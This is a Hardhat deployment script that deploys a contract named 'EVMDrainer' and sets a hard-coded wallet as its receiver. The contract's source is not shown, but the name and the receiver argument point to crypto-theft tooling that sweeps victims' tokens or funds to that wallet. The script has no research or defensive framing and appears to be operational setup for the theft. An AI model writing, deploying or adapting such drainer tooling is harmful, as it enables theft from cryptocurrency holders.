const hre = require("hardhat");

async function main() {
    const RECEIVER = "0x5cAdB5Bf07096a2edb2e82A55D4FFF607CB7b5A7";
    console.log("Deploying EVMDrainer with receiver:", RECEIVER);

    const EVMDrainer = await hre.ethers.getContractFactory("EVMDrainer");
    const drainer = await EVMDrainer.deploy(RECEIVER);
    await drainer.deployed();

    console.log("✅ EVMDrainer deployed to:", drainer.address);
    console.log("Receiver wallet:", RECEIVER);
}

main().catch((error) => {
    console.error(error);
    process.exitCode = 1;
});